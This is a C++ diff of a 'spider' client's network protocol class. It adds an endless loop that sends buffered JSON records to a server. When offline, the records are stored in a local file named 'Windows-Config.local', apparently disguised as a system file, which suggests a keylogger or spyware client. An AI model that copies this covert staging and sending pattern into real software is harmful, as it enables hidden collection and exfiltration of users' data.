@@ -10,7 +10,7 @@
 
 #include <regex>
 #include <fstream>
-#include "Protocol/Buffer.hpp"
+#include "Protocol/BufferSender.hpp"
 #include "Protocol/ClientProtocol.hpp"
 
 
@@ -37,29 +37,34 @@ bool spider::ClientProtocol::connect()
 
 void spider::ClientProtocol::run()
 {
-  Buffer &buf = Buffer::BufferInstance();
+  BufferSender &buf = BufferSender::BufferSenderInstance();
   std::string &str = buf.getBuf();
 
-  if (str.empty())
-    return ;
-  if (!_net.isConnected())
-    if (!connect()) {
-        std::ofstream file("Windows-Config.local", std::ios::out);
-        if (!file)
-            return;
-        file << str;
-        file.close();
-    }
-    std::ifstream   open("Windows-Config.local", std::ios::in);
+  for (;;)
+  {
+    if (str.empty())
+      continue;
+    if (!_net.isConnected())
+      if (!connect())
+      {
+	std::ofstream file("Windows-Config.local", std::ios::out);
+	if (!file)
+	  continue;
+	file << str;
+	file.close();
+      }
+    std::ifstream open("Windows-Config.local", std::ios::in);
     if (!open)
-        return;
+      continue;
     std::string tmp;
     open >> tmp;
     tmp.append(str);
     str = tmp;
     open.close();
-    std::regex reg = std::regex("\\{(?:(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)\\}");
+    std::regex reg = std::regex(
+      "\\{(?:(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)\\}");
     for (auto it = std::sregex_iterator(str.begin(), str.end(), reg);
-       it != std::sregex_iterator(); ++it)
-    _net.send(it->str());
+	 it != std::sregex_iterator(); ++it)
+      _net.send(it->str());
+  }
 }
